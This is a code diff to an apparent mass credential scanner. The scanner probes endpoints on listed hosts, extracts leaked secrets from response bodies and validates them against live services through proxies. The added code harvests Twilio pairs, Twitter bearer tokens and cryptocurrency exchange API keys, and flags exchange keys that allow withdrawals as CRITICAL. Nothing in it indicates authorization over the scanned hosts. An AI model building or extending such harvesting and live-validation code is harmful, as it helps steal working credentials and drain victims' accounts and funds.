@@ -16,12 +16,18 @@ from .ai_verify import (
     extract_ai_keys,
     extract_aws_keypairs,
     extract_dsns,
+    extract_exchange_pairs,
     extract_secrets,
     extract_telegram_bots,
+    extract_twilio_pairs,
+    extract_twitter_bearers,
     verify_ai_key,
     verify_aws_keypair,
+    verify_exchange_keypair,
     verify_secret,
     verify_telegram_bot,
+    verify_twilio_pair,
+    verify_twitter_bearer,
 )
 from .config import Settings
 from .models import HostRow, CheckResult
@@ -343,6 +349,10 @@ SEVERITY_MAP = {
     "sendgrid_key_valid": "HIGH",
     "npm_token_valid": "MEDIUM",
     "dropbox_token_valid": "HIGH",
+    "twilio_pair_valid": "HIGH",
+    "twitter_token_valid": "MEDIUM",
+    "exchange_key_valid": "CRITICAL",
+    "exchange_withdraw_enabled": "CRITICAL",
     "dsn_reachable": "MEDIUM",
     "dsn_auth_ok": "CRITICAL",
     "slack_token": "HIGH",
@@ -557,6 +567,10 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             aws_keypairs_found: set[tuple[str, str]] = set()
             dsns_found: set[str] = set()
             secrets_found: set[tuple[str, str]] = set()
+            twilio_pairs_found: set[tuple[str, str]] = set()
+            twitter_bearers_found: set[str] = set()
+            exchange_pairs_found: list[dict[str, Any]] = []
+            exchange_pairs_seen: set[tuple[str, str, str]] = set()
 
             # 4. Тестируем эндпоинты
             for path_template, methods in paths.items():
@@ -642,6 +656,17 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                     )
                                 if cfg.secret_checks:
                                     secrets_found.update(extract_secrets(body[:100_000]))
+                                if cfg.twilio_checks:
+                                    twilio_pairs_found.update(extract_twilio_pairs(body[:100_000]))
+                                if cfg.twitter_checks:
+                                    twitter_bearers_found.update(
+                                        extract_twitter_bearers(body[:100_000]))
+                                if cfg.exchange_checks:
+                                    for p in extract_exchange_pairs(body[:100_000]):
+                                        sig = (p["exchange"], p["key"], p["secret"])
+                                        if sig not in exchange_pairs_seen:
+                                            exchange_pairs_seen.add(sig)
+                                            exchange_pairs_found.append(p)
 
                                 if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
                                     max_severity = sev
@@ -774,6 +799,54 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                         if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
                             max_severity = sev
 
+            # Twilio-пары: HTTP Basic, read-only
+            twilio_checks: list[dict[str, Any]] = []
+            if cfg.twilio_checks and twilio_pairs_found:
+                for sid, tok in list(twilio_pairs_found)[: cfg.twilio_max]:
+                    chk = await verify_twilio_pair(
+                        session, sid, tok,
+                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
+                    )
+                    twilio_checks.append(chk)
+                    if chk["status"] == "valid":
+                        all_patterns.append("twilio_pair_valid")
+                        if severity_order.get(SEVERITY_MAP["twilio_pair_valid"], 0) > \
+                                severity_order.get(max_severity, 0):
+                            max_severity = SEVERITY_MAP["twilio_pair_valid"]
+
+            # Twitter/X app bearer
+            twitter_checks: list[dict[str, Any]] = []
+            if cfg.twitter_checks and twitter_bearers_found:
+                for tok in list(twitter_bearers_found)[: cfg.twitter_max]:
+                    chk = await verify_twitter_bearer(
+                        session, tok,
+                        proxy=proxy, timeout_s=max(cfg.check_timeout, 5),
+                    )
+                    twitter_checks.append(chk)
+                    if chk["status"] == "valid":
+                        all_patterns.append("twitter_token_valid")
+                        if severity_order.get(SEVERITY_MAP["twitter_token_valid"], 0) > \
+                                severity_order.get(max_severity, 0):
+                            max_severity = SEVERITY_MAP["twitter_token_valid"]
+
+            # Биржевые ключи: HMAC, read-only — баланс + право вывода (связка)
+            exchange_checks: list[dict[str, Any]] = []
+            if cfg.exchange_checks and exchange_pairs_found:
+                for p in exchange_pairs_found[: cfg.exchange_max]:
+                    chk = await verify_exchange_keypair(
+                        session, p["exchange"], p["key"], p["secret"],
+                        passphrase=p["passphrase"],
+                        proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
+                    )
+                    exchange_checks.append(chk)
+                    if chk["status"] == "valid":
+                        all_patterns.append("exchange_key_valid")
+                        if severity_order.get(SEVERITY_MAP["exchange_key_valid"], 0) > \
+                                severity_order.get(max_severity, 0):
+                            max_severity = SEVERITY_MAP["exchange_key_valid"]
+                        if chk.get("withdraw_enabled") is True:
+                            all_patterns.append("exchange_withdraw_enabled")
+
             result.endpoints = endpoints_data
             result.data_patterns = list(set(all_patterns))
             result.severity = max_severity
@@ -810,6 +883,9 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 "aws_key_checks": aws_key_checks,
                 "dsn_checks": dsn_checks,
                 "secret_checks": secret_checks,
+                "twilio_checks": twilio_checks,
+                "twitter_checks": twitter_checks,
+                "exchange_checks": exchange_checks,
             }
 
     except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
